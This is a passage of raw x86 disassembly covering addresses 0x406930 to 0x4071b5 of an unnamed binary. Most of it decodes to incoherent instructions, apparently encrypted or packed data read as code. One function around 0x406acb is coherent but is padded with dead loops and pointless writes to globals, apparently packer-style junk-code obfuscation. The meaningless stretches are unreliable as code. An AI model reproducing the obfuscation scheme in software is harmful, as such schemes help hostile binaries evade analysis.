  406930:	add    al,0xe0
  406932:	fisttp QWORD PTR [edi]
  406934:	inc    esi
  406935:	jo     0x4069a8
  406937:	sub    DWORD PTR [edx-0x58b2a71d],esi
  40693d:	mov    al,ds:0xa6adaf38
  406942:	stos   DWORD PTR es:[edi],eax
  406943:	inc    esi
  406944:	lahf   
  406945:	repz add al,0x78
  406948:	and    al,0x33
  40694a:	mov    ch,0xbd
  40694c:	les    eax,FWORD PTR [esi]
  40694e:	cli    
  40694f:	or     al,0xa5
  406951:	ret    0x7f71
  406954:	sbb    eax,0x518dc9a7
  406959:	or     al,0x10
  40695b:	int    0x57
  40695d:	adc    esp,DWORD PTR [edi+0x3b]
  406960:	push   esp
  406961:	fidivr DWORD PTR [eax+eax*1]
  406964:	imul   ebx,esp,0x40
  406967:	je     0x4069c6
  406969:	(bad)  
  40696a:	push   0x838a61da
  40696f:	pop    ds
  406970:	and    BYTE PTR [eax-0x7],al
  406973:	in     eax,dx
  406974:	dec    esp
  406975:	int    0x7d
  406977:	xchg   ecx,eax
  406978:	and    al,BYTE PTR [ebp+0x1ed35c69]
  40697e:	xchg   esp,eax
  40697f:	or     ebx,eax
  406981:	pop    ebx
  406982:	push   edx
  406983:	jne    0x4069a9
  406985:	mov    DWORD PTR [esp+eax*2+0xb],0x845d2cf9
  40698d:	mov    ch,0xaf
  40698f:	mov    bh,0x3d
  406991:	push   edx
  406992:	stos   BYTE PTR es:[edi],al
  406993:	rcl    ebx,cl
  406995:	cli    
  406996:	sub    dh,0x8d
  406999:	add    DWORD PTR [ebx],ebp
  40699b:	xor    eax,0xc5484321
  4069a0:	outs   dx,DWORD PTR ds:[esi]
  4069a1:	add    ecx,ebx
  4069a3:	mov    dl,0x8c
  4069a5:	ret    0x1498
  4069a8:	mov    bl,BYTE PTR [esi-0x740e975f]
  4069ae:	pushf  
  4069af:	imul   ebp,DWORD PTR [edx+0x4296598e],0x4e66c3a5
  4069b9:	and    DWORD PTR [esi+ebx*1+0x76],ebx
  4069bd:	mov    cl,0xc8
  4069bf:	mov    esp,0x4f8ed0b2
  4069c4:	add    al,0x3c
  4069c6:	mov    bh,0x11
  4069c8:	stos   DWORD PTR es:[edi],eax
  4069c9:	fisttp DWORD PTR [eax-0x21]
  4069cc:	iret   
  4069cd:	inc    ebp
  4069ce:	data16 cmp cl,BYTE PTR [ebx+ecx*1+0x21]
  4069d3:	push   ebx
  4069d4:	mov    BYTE PTR [ecx],ch
  4069d6:	sub    al,0xd0
  4069d8:	adc    eax,0xa24da518
  4069dd:	lea    eax,[ebp-0x2e6259d0]
  4069e3:	sub    BYTE PTR [eax+0x42],0xb6
  4069e7:	shr    BYTE PTR [edx],0x75
  4069ea:	into   
  4069eb:	(bad)  
  4069ed:	adc    dh,0x93
  4069f0:	call   0x570c:0x3daf755
  4069f7:	adc    ch,BYTE PTR [ebp-0x65]
  4069fa:	pop    esi
  4069fb:	mov    ds:0x187453fa,eax
  406a00:	xor    BYTE PTR [ebx-0x2691bdf5],0x75
  406a07:	mov    edx,0xc21e9073
  406a0c:	dec    ebx
  406a0d:	and    eax,0x12327cff
  406a12:	fwait
  406a13:	popf   
  406a14:	jne    0x4069f4
  406a16:	cs aaa 
  406a18:	sar    BYTE PTR [edi+edx*2+0x4da33131],cl
  406a1f:	jo     0x4069f9
  406a21:	int    0x94
  406a23:	pop    edi
  406a24:	mov    cl,BYTE PTR [edx-0x2cfa5704]
  406a2a:	ficomp WORD PTR [edi]
  406a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a2d:	mov    cl,BYTE PTR [edi-0xf191655]
  406a33:	stos   DWORD PTR es:[edi],eax
  406a34:	cwde   
  406a35:	retf   0xe554
  406a38:	dec    ebx
  406a39:	pop    es
  406a3a:	adc    esi,DWORD PTR [ebx-0x25f40c58]
  406a40:	aad    0xe2
  406a42:	lds    ebp,FWORD PTR [ecx+0x5325e446]
  406a48:	jp     0x406a38
  406a4a:	sar    DWORD PTR [ebp-0x51f24f56],1
  406a50:	int3   
  406a51:	push   esp
  406a52:	ins    DWORD PTR es:[edi],dx
  406a53:	sar    DWORD PTR [eax+0x4a36933],0x12
  406a5a:	and    BYTE PTR [ebp-0x609aa43e],ch
  406a60:	sbb    al,0x28
  406a62:	adc    BYTE PTR [ecx+0x5a],0xeb
  406a66:	(bad)  
  406a67:	dec    edx
  406a68:	cmp    BYTE PTR [edi+0x493d2959],bl
  406a6e:	pop    esi
  406a6f:	and    BYTE PTR [edx],bl
  406a71:	mov    al,0xa6
  406a73:	(bad)  [ecx+0x3f]
  406a76:	ins    BYTE PTR es:[edi],dx
  406a77:	pop    ss
  406a78:	in     eax,0x1e
  406a7a:	xchg   BYTE PTR [ebp+ecx*2-0x24ddcb41],al
  406a81:	cdq    
  406a82:	adc    eax,0x168db0c6
  406a87:	add    al,0x53
  406a89:	or     al,0x21
  406a8b:	inc    ecx
  406a8c:	mov    esi,0xaa13bf1a
  406a91:	push   ebx
  406a92:	sbb    ebp,DWORD PTR [edx-0x2fcfb70e]
  406a98:	lods   eax,DWORD PTR ds:[esi]
  406a99:	jecxz  0x406aea
  406a9b:	push   ds
  406a9c:	jnp    0x406a47
  406a9e:	xchg   DWORD PTR [ebx-0x56],eax
  406aa1:	sub    esp,ebx
  406aa3:	mov    esp,0xf9bbb9b
  406aa8:	push   ecx
  406aa9:	inc    esi
  406aaa:	jg     0x406a86
  406aac:	or     BYTE PTR [edx],bh
  406aae:	or     al,0x25
  406ab0:	and    dh,BYTE PTR [ecx-0x25d94792]
  406ab6:	cld    
  406ab7:	dec    edx
  406ab8:	(bad)  
  406ab9:	xchg   ebp,eax
  406aba:	dec    edi
  406abb:	out    0xea,al
  406abd:	fstp   QWORD PTR ds:0x5c133ee
  406ac3:	pushf  
  406ac4:	jb     0x406af8
  406ac6:	add    cl,cl
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e7fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fe01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fdd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e7ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fdd9
  406b20:	and    esi,DWORD PTR ds:0x42e228
  406b26:	mov    DWORD PTR ds:0x42fdd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e7f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e7f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e7f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e3df
  406b61:	mov    edi,DWORD PTR ds:0x42e7f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e7f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fdf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fdf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fdf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fdfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e63f
  406bad:	mov    edi,DWORD PTR ds:0x42fdf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fdf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fde5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fde5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fde5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fde5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fde5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fded
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e55b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fe76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fe76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fe76,edi
  406c22:	cmp    DWORD PTR ds:0x42fe76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e807
  406c34:	push   0x42e2a4
  406c39:	call   DWORD PTR ds:0x42e643
  406c3f:	cmp    DWORD PTR ds:0x42fe76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fe76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fe76,edi
  406c59:	cmp    DWORD PTR ds:0x42fe76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e813,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e80b,0x42fe76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0xe1
  406c9b:	popa   
  406c9c:	inc    esp
  406c9d:	popf   
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c86
  406ca7:	fisub  WORD PTR [edi+edx*1-0x4d]
  406cab:	int    0x9d
  406cad:	dec    ebx
  406cae:	dec    edi
  406caf:	mov    eax,ds:0xa0df7182
  406cb4:	aas    
  406cb5:	mov    bl,0x87
  406cb7:	inc    edx
  406cb8:	(bad)  
  406cb9:	cmp    eax,0x2f22aef2
  406cbe:	dec    esp
  406cbf:	(bad)  
  406cc1:	xchg   ebp,eax
  406cc2:	mov    di,ax
  406cc5:	and    DWORD PTR [esi+edi*2],ebp
  406cc8:	push   0x47e0e492
  406ccd:	and    ecx,esi
  406ccf:	jp     0x406d14
  406cd1:	jecxz  0x406ccc
  406cd3:	xchg   esp,eax
  406cd4:	call   0x184d6335
  406cd9:	mov    esp,0xc43a2d5f
  406cde:	pop    eax
  406cdf:	and    dh,BYTE PTR [esi-0x3056dc57]
  406ce5:	cwde   
  406ce6:	mov    WORD PTR [eax],ss
  406ce8:	out    0x32,al
  406cea:	fimul  WORD PTR [ecx-0x79]
  406ced:	lods   al,BYTE PTR ds:[esi]
  406cee:	fidiv  WORD PTR [esi+0x5e640645]
  406cf4:	jge    0x406cf1
  406cf6:	push   cs
  406cf7:	mov    esp,0xb2b3394a
  406cfc:	sub    dh,BYTE PTR [ebx+0x1c]
  406cff:	loope  0x406d48
  406d01:	and    esp,DWORD PTR [eax+edx*2+0x12d476a7]
  406d08:	into   
  406d09:	xchg   ebp,eax
  406d0a:	adc    esp,ebp
  406d0c:	ror    DWORD PTR [ecx],0xe0
  406d0f:	lock jbe 0x406ced
  406d12:	inc    esi
  406d13:	sub    BYTE PTR [edx-0x61c01ab5],ch
  406d19:	sub    eax,0xe7911139
  406d1e:	int3   
  406d1f:	(bad)  
  406d20:	test   eax,0xaf393532
  406d25:	repnz or al,0x22
  406d28:	fstp   DWORD PTR [edx+ebx*1]
  406d2b:	ror    BYTE PTR [ebp-0x56bdaafc],cl
  406d31:	inc    edi
  406d32:	jb     0x406d00
  406d34:	fldenv [ecx-0x1e1d8fbc]
  406d3a:	xchg   ecx,eax
  406d3b:	dec    ebp
  406d3c:	pushf  
  406d3d:	pop    eax
  406d3e:	pushf  
  406d3f:	add    eax,0xd5f254da
  406d44:	ins    BYTE PTR es:[edi],dx
  406d45:	push   cs
  406d46:	mov    ecx,DWORD PTR [ebp-0x31]
  406d49:	aad    0x60
  406d4b:	jns    0x406db6
  406d4d:	fwait
  406d4e:	pusha  
  406d4f:	jle    0x406db4
  406d51:	and    al,0xdd
  406d53:	ss scas eax,DWORD PTR es:[edi]
  406d55:	jo     0x406d03
  406d57:	adc    al,dl
  406d59:	ins    DWORD PTR es:[edi],dx
  406d5a:	push   ebp
  406d5b:	ins    DWORD PTR es:[edi],dx
  406d5c:	dec    ecx
  406d5d:	adc    BYTE PTR [esi-0x63],bl
  406d60:	pop    edx
  406d61:	adc    eax,0x557ac0e7
  406d66:	jnp    0x406d45
  406d68:	mov    al,ds:0x94f774bc
  406d6e:	add    BYTE PTR [ebx],ah
  406d70:	pusha  
  406d71:	mov    bh,0x6b
  406d73:	dec    esi
  406d74:	jl     0x406dba
  406d76:	clc    
  406d77:	or     BYTE PTR [edx],ah
  406d79:	mov    cs,WORD PTR [eax]
  406d7b:	jg     0x406d56
  406d7d:	inc    eax
  406d7e:	mov    cl,0xc5
  406d80:	push   esp
  406d81:	retf   0xd126
  406d84:	stc    
  406d85:	cmp    al,BYTE PTR [ecx+0xa]
  406d88:	lods   al,BYTE PTR ds:[esi]
  406d89:	cmp    eax,ecx
  406d8b:	inc    eax
  406d8c:	mov    DWORD PTR [esi-0x4],ebx
  406d8f:	ror    dh,1
  406d91:	push   esi
  406d92:	inc    edi
  406d93:	loope  0x406dc4
  406d95:	pop    ds
  406d96:	dec    ebp
  406d97:	xor    DWORD PTR [edx+0x3],edi
  406d9a:	push   ebx
  406d9b:	pop    esp
  406d9c:	xor    BYTE PTR [edi],0x32
  406d9f:	retf   0x44f7
  406da2:	push   ebx
  406da3:	inc    ebx
  406da4:	enter  0xd500,0xec
  406da8:	jg     0x406def
  406daa:	xchg   esp,eax
  406dab:	add    ebx,0x4e9f22e9
  406db1:	mov    esi,0xa5d49182
  406db6:	sbb    ebp,DWORD PTR [ecx+0x13]
  406db9:	(bad)  
  406dba:	sti    
  406dbb:	loopne 0x406deb
  406dbd:	push   edi
  406dbe:	ret    
  406dbf:	sbb    al,0x2d
  406dc1:	aaa    
  406dc2:	cld    
  406dc3:	mov    cl,0x67
  406dc5:	inc    edx
  406dc6:	inc    esp
  406dc7:	lods   al,BYTE PTR gs:[esi]
  406dc9:	sbb    DWORD PTR [edx-0x1ae4fdc],ebp
  406dcf:	add    dl,0x40
  406dd2:	(bad)  [edi-0x20]
  406dd5:	call   0x8b0b5d5
  406dda:	das    
  406ddb:	xor    BYTE PTR [esi-0x214f82e7],al
  406de1:	adc    al,0x58
  406de3:	mov    ebp,DWORD PTR [eax-0x53]
  406de6:	nop
  406de7:	sahf   
  406de8:	aaa    
  406de9:	scas   eax,DWORD PTR es:[edi]
  406dea:	test   eax,0x4efbc002
  406def:	cmp    BYTE PTR [ebx],cl
  406df1:	cmp    DWORD PTR ss:[ecx+ecx*4],edx
  406df5:	lods   eax,DWORD PTR ds:[esi]
  406df6:	and    eax,0x4c5f7399
  406dfb:	jp     0x406da6
  406dfd:	and    BYTE PTR [edi+0x10e4aad8],dh
  406e03:	dec    ebx
  406e04:	xchg   esi,eax
  406e05:	fs adc eax,0xbe45d0a4
  406e0b:	or     al,0xd3
  406e0d:	cld    
  406e0e:	rol    DWORD PTR [ebp-0x7988fdf6],cl
  406e14:	repnz outs dx,DWORD PTR ds:[esi]
  406e16:	test   DWORD PTR [esp+ebx*1],0x85910226
  406e1d:	shl    esi,cl
  406e1f:	(bad)  
  406e20:	dec    ebp
  406e21:	cmp    al,bh
  406e23:	loop   0x406e3e
  406e25:	xchg   BYTE PTR [eax],ah
  406e27:	(bad)
  406e2c:	or     BYTE PTR [edx-0x2b],bh
  406e2f:	xor    ecx,DWORD PTR [ecx+eiz*2-0x31]
  406e33:	int    0x84
  406e35:	shr    esp,0xc0
  406e38:	inc    ecx
  406e39:	jmp    0xeb5f6607
  406e3e:	and    eax,0xf9078703
  406e43:	ret    0x5a19
  406e46:	mov    bh,0xc
  406e48:	dec    esp
  406e49:	(bad)  
  406e4a:	iret   
  406e4b:	jns    0x406eb1
  406e4d:	ficomp WORD PTR [ebx+0xc]
  406e50:	leave  
  406e51:	aas    
  406e52:	(bad)  
  406e53:	loope  0x406dec
  406e55:	mov    al,0x2
  406e57:	jg     0x406e6f
  406e59:	dec    esp
  406e5a:	in     eax,dx
  406e5b:	sbb    DWORD PTR [edx],eax
  406e5d:	inc    eax
  406e5e:	push   edx
  406e5f:	in     eax,0x4
  406e61:	jg     0x406e9c
  406e63:	or     bh,BYTE PTR [ecx+0x32]
  406e66:	pusha  
  406e67:	mov    dh,bl
  406e69:	ret    0x3190
  406e6c:	xor    eax,0xbe6558ee
  406e71:	mov    ecx,0xd68d7a2
  406e76:	in     eax,0x23
  406e78:	(bad)  
  406e79:	xchg   esp,eax
  406e7a:	bound  ebx,QWORD PTR [ebx+0x58]
  406e7d:	adc    DWORD PTR [ebp+0x4f],ecx
  406e80:	mov    ?,WORD PTR [esi+0x49]
  406e83:	das    
  406e84:	cmp    ebp,DWORD PTR [esi+eiz*1]
  406e87:	mov    bh,0x1d
  406e89:	test   esi,edi
  406e8b:	leave  
  406e8c:	push   edi
  406e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e8e:	rcr    ah,cl
  406e90:	fwait
  406e91:	jle    0x406efc
  406e93:	dec    ebx
  406e94:	sub    ch,BYTE PTR [edx]
  406e96:	xor    ebx,esp
  406e98:	enter  0x73ed,0xc7
  406e9c:	sub    al,0xa9
  406e9e:	shl    BYTE PTR [ebp+0x2687dc5],0x71
  406ea5:	pop    ss
  406ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ea7:	jmp    0x93db:0xb8395cbe
  406eae:	dec    ebx
  406eaf:	xchg   esi,eax
  406eb0:	(bad)  
  406eb1:	jg     0x406e79
  406eb3:	in     al,dx
  406eb4:	retf   0x458e
  406eb7:	loope  0x406e71
  406eb9:	popf   
  406eba:	js     0x406ee7
  406ebc:	aam    0x4
  406ebe:	stos   DWORD PTR es:[edi],eax
  406ebf:	xchg   edx,eax
  406ec0:	pushf  
  406ec1:	test   al,0x73
  406ec3:	aas    
  406ec4:	sub    bl,BYTE PTR [ebp-0x5c5477b2]
  406eca:	outs   dx,DWORD PTR ds:[esi]
  406ecb:	pushf  
  406ecc:	pop    ebx
  406ecd:	jle    0x406e5e
  406ecf:	xbegin 0xd9d5ab0b
  406ed5:	adc    ebp,DWORD PTR [edi+0x7b]
  406ed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ed9:	mov    cl,0x9f
  406edb:	daa    
  406edc:	loope  0x406e9a
  406ede:	sti    
  406edf:	ins    BYTE PTR es:[edi],dx
  406ee0:	jg     0x406e98
  406ee2:	(bad)  
  406ee3:	iret   
  406ee4:	out    dx,eax
  406ee5:	cmp    BYTE PTR [edx],al
  406ee7:	and    BYTE PTR [edx-0x2b],dl
  406eea:	jge    0x406ee7
  406eec:	xor    BYTE PTR [esi+0x3f5d29ea],ch
  406ef2:	pop    edx
  406ef3:	mov    ds:0xb0ce83f6,eax
  406ef8:	add    eax,0xd3a4ce3c
  406efd:	(bad)  
  406efe:	mov    ebx,0xa539eb07
  406f03:	adc    ecx,DWORD PTR [edx-0x23eebfa9]
  406f09:	cld    
  406f0a:	cwde   
  406f0b:	mov    WORD PTR [edi],fs
  406f0d:	aaa    
  406f0e:	or     al,0x15
  406f10:	mov    bl,0xfd
  406f12:	ror    DWORD PTR [ebx+0x36],1
  406f15:	sbb    ch,BYTE PTR [esi-0x69b916c6]
  406f1b:	stos   BYTE PTR es:[edi],al
  406f1c:	mov    es,WORD PTR [ebx+0x18]
  406f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f20:	test   al,0x58
  406f22:	stos   BYTE PTR es:[edi],al
  406f23:	add    BYTE PTR [esi+0x230601ff],bl
  406f29:	jg     0x406f81
  406f2b:	and    ch,ch
  406f2d:	ret    0x9552
  406f30:	xor    edi,DWORD PTR [ecx-0x1cd8c626]
  406f36:	ins    BYTE PTR es:[edi],dx
  406f37:	data16 arpl WORD PTR [ecx-0x5a4a9673],ax
  406f3e:	sbb    al,0xef
  406f40:	xchg   ecx,eax
  406f41:	push   edx
  406f42:	cmp    al,0xa8
  406f44:	sbb    al,0x44
  406f46:	pop    ebp
  406f47:	mov    esp,0x3743061b
  406f4c:	jmp    0xa849:0xff08ee7e
  406f53:	xchg   edi,eax
  406f54:	xor    edi,DWORD PTR [eax+0x2b]
  406f57:	(bad)  
  406f58:	fild   DWORD PTR [ebp-0x5a]
  406f5b:	imul   esp,ebp,0xffffffa7
  406f5e:	sar    DWORD PTR [edx],cl
  406f60:	xchg   esi,eax
  406f61:	aaa    
  406f62:	ror    DWORD PTR [edi+0x42],1
  406f65:	les    ebp,FWORD PTR [edi-0x362493fc]
  406f6b:	lods   al,BYTE PTR ds:[esi]
  406f6c:	jmp    FWORD PTR [esi+ebp*1+0xfa5f0c7]
  406f73:	pop    ebp
  406f74:	int    0x40
  406f76:	js     0x406efd
  406f78:	out    0xb8,eax
  406f7a:	data16 jl 0x406f5a
  406f7d:	ins    BYTE PTR es:[edi],dx
  406f7e:	push   ecx
  406f7f:	jnp    0x406f07
  406f81:	sub    al,0xd3
  406f83:	or     dl,dh
  406f85:	das    
  406f86:	call   0x2620:0x66cf66ab
  406f8d:	mov    ds:0xfe46da21,eax
  406f92:	in     al,dx
  406f93:	daa    
  406f94:	xchg   esi,eax
  406f95:	jne    0x406f85
  406f97:	call   0xb16b:0xb2381cff
  406f9e:	cmc    
  406f9f:	adc    DWORD PTR [edx-0x6655aca5],edx
  406fa5:	in     eax,dx
  406fa6:	(bad)
  406faa:	push   ebp
  406fab:	sbb    al,BYTE PTR [eax+0x55ea181b]
  406fb1:	sbb    esi,ecx
  406fb3:	mov    edi,0x5533abe0
  406fb8:	jecxz  0x406f4f
  406fba:	shl    BYTE PTR [eax-0x44],cl
  406fbd:	mov    ebx,0xa5f2b4c
  406fc2:	cmp    eax,0x1997997
  406fc7:	push   0x82d5f26f
  406fcc:	sbb    edi,DWORD PTR [ebp+0x53a8d1e7]
  406fd2:	jmp    0xcc45:0xc7d3c837
  406fd9:	xor    DWORD PTR ds:0x1581f89f,eax
  406fdf:	jb     0x406fdf
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx],cl
  406fe4:	call   0x4607702b
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   ax,sp
  40700c:	xchg   edi,eax
  40700d:	dec    ebx
  40700e:	js     0x406fd7
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x406fc7
  407018:	js     0x407087
  40701a:	adc    BYTE PTR [ebp+0x5547aa61],0xe3
  407021:	pop    ebp
  407022:	xchg   ebx,eax
  407023:	xor    BYTE PTR [eax+0x63],ah
  407026:	dec    ebx
  407027:	test   BYTE PTR [esi],dl
  407029:	mov    dh,0x89
  40702b:	cmc    
  40702c:	out    dx,eax
  40702d:	adc    DWORD PTR [edi+0x50519c7b],ebp
  407033:	es ss jge 0x4070ae
  407037:	stos   DWORD PTR es:[edi],eax
  407038:	pop    esi
  407039:	dec    ebp
  40703a:	fldenv [eax+eax*8]
  40703d:	xor    ah,BYTE PTR [ecx-0x6a]
  407040:	push   eax
  407041:	jmp    0x40705f
  407043:	mov    edx,DWORD PTR [edi-0xa714364]
  407049:	(bad)  
  40704a:	out    0xb1,eax
  40704c:	ins    DWORD PTR es:[edi],dx
  40704d:	or     al,0x73
  40704f:	mov    ebp,0x7b70012b
  407054:	test   DWORD PTR [esi+0x4b47043c],edi
  40705a:	hlt    
  40705b:	aam    0x27
  40705d:	xchg   esp,eax
  40705e:	mov    esi,0xdd4c7e5
  407063:	sbb    DWORD PTR [edx],esi
  407065:	mov    ch,0x60
  407067:	xchg   ebp,eax
  407068:	sbb    DWORD PTR [ebx+0x20d15273],0xecfd7546
  407072:	sbb    bl,BYTE PTR [edi+0x43]
  407075:	inc    esp
  407076:	dec    esi
  407077:	sub    ah,BYTE PTR [edi+0x66]
  40707a:	std    
  40707b:	dec    ecx
  40707c:	fdivr  DWORD PTR [eax+0x71cd7e48]
  407082:	sar    BYTE PTR [esi],1
  407084:	mov    ds:0x5c41bc7f,al
  407089:	repz (bad) 
  40708b:	dec    esp
  40708c:	fimul  WORD PTR [edx+0x67]
  40708f:	inc    edx
  407090:	dec    ebx
  407091:	sar    BYTE PTR [ecx-0x6e],cl
  407094:	popf   
  407095:	loope  0x407088
  407097:	addr16 xchg esp,eax
  407099:	dec    edx
  40709a:	jge    0x407066
  40709c:	xlat   BYTE PTR ds:[ebx]
  40709d:	inc    edx
  40709e:	push   0x1e
  4070a0:	fstp   DWORD PTR [edi]
  4070a2:	push   ebp
  4070a3:	pushf  
  4070a4:	mov    ds:0x6a654b79,al
  4070a9:	push   edi
  4070aa:	push   eax
  4070ab:	ds ds mov bl,0xcc
  4070af:	dec    esi
  4070b0:	mov    eax,gs:0xd82f672a
  4070b6:	xor    eax,0xd51973d2
  4070bb:	sub    ebp,DWORD PTR [ebx-0x7e]
  4070be:	sub    BYTE PTR [edi+0x3c],ah
  4070c1:	or     BYTE PTR ds:[eax+esi*2],cl
  4070c5:	pop    esi
  4070c6:	jne    0x4070d8
  4070c8:	enter  0xe017,0x9c
  4070cc:	xchg   esp,eax
  4070cd:	stc    
  4070ce:	and    BYTE PTR [ebx],bl
  4070d0:	ins    DWORD PTR es:[edi],dx
  4070d1:	pushf  
  4070d2:	adc    DWORD PTR [ebx+ecx*4-0x39],0x3ba69b13
  4070da:	pushf  
  4070db:	in     al,dx
  4070dc:	xchg   ecx,eax
  4070dd:	fucom  st(0)
  4070df:	sbb    cl,BYTE PTR ds:0xb97c8e3d
  4070e5:	nop
  4070e6:	inc    eax
  4070e7:	rol    DWORD PTR [esi+0x6f9b7052],cl
  4070ed:	mov    eax,0x1bfbca53
  4070f2:	or     dh,BYTE PTR cs:[ebx]
  4070f5:	popa   
  4070f6:	ins    DWORD PTR es:[edi],dx
  4070f7:	dec    ecx
  4070f8:	push   esi
  4070f9:	aas    
  4070fa:	sub    DWORD PTR [ebp+0x26bb564e],eax
  407100:	add    eax,0xd3105746
  407105:	das    
  407106:	push   0xf34339cf
  40710b:	outs   dx,BYTE PTR ds:[esi]
  40710c:	pop    ebx
  40710d:	aam    0x86
  40710f:	sbb    dh,BYTE PTR [edx+edx*4+0x1fc4e426]
  407116:	in     al,0x80
  407118:	or     cl,ah
  40711a:	add    al,0x24
  40711c:	jge    0x4070e4
  40711e:	seta   BYTE PTR [edi-0xa]
  407122:	test   eax,0x839a94ed
  407127:	out    dx,al
  407128:	jo     0x40714d
  40712a:	add    edi,0xffffff9f
  40712d:	cmp    DWORD PTR ds:0x42ef6858,ebp
  407133:	and    DWORD PTR [ebx-0x7f],edx
  407136:	aas    
  407137:	push   0x44a5e221
  40713c:	jg     0x407132
  40713e:	int    0x15
  407140:	ss mov ecx,0x25b468f6
  407146:	out    0xf1,eax
  407148:	out    dx,al
  407149:	xchg   edx,eax
  40714a:	mov    ss,WORD PTR [ebx+0x635f1fe4]
  407150:	sub    al,0xc0
  407152:	out    0xaa,al
  407154:	test   eax,0xf25ec870
  407159:	in     eax,dx
  40715a:	push   ss
  40715b:	aas    
  40715c:	xchg   ebp,eax
  40715d:	jns    0x407147
  40715f:	push   edi
  407160:	leave  
  407161:	dec    ebp
  407162:	cmp    DWORD PTR [eax+0x46],esi
  407165:	push   es
  407166:	sub    ebx,edi
  407168:	(bad)  
  407169:	stc    
  40716a:	xor    eax,0xf737dd30
  40716f:	mov    bl,0x1f
  407171:	push   cs
  407172:	push   ecx
  407173:	jmp    0x61172d16
  407178:	pop    esp
  407179:	rcr    DWORD PTR [edi+0x5c862f9a],0x36
  407180:	sbb    al,0xe7
  407182:	pop    es
  407183:	mov    ah,0xdd
  407185:	fwait
  407186:	push   es
  407187:	out    0xcb,eax
  407189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40718a:	jle    0x40716b
  40718c:	cmp    DWORD PTR [edx-0x440ca098],ebx
  407192:	(bad)  
  407193:	std    
  407194:	push   ebx
  407195:	cmp    dl,BYTE PTR [eax+0x6969bae2]
  40719b:	push   ds
  40719c:	mov    ah,0xef
  40719e:	jl     0x407201
  4071a0:	fnstsw WORD PTR [eax-0x784923e4]
  4071a6:	sub    BYTE PTR [esi+0x32a890f0],0xca
  4071ad:	xchg   ecx,eax
  4071ae:	cmp    eax,0xcf72f726
  4071b3:	dec    esp
  4071b4:	pop    edx
  4071b5:	jle    0x407232
